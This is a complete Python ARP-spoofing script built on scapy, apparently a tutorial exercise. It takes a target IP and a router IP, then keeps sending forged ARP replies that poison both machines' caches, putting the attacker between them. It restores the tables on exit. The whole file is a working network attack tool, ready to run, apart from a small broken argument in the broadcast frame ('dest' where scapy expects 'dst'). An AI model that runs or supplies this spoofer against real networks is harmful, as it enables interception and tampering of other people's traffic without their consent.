#! /usr/bin/env python

import scapy.all as scapy
import time
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Define target IP address to search")
    parser.add_option("-r", "--router", dest="router_ip", help="Define router IP address to search")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a valid IP address, use --help for more info")
    elif not options.router_ip:
        parser.error("[-] Please specify a valid IP address, use --help for more info")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dest="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0
options = get_arguments()
target_ip = options.target_ip
router_ip = options.router_ip

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count = sent_packets_count+2
        print("\r[+] Packets sent: "+ str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Resetting ARP tables")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[-] Program stopped using Ctrl + C")
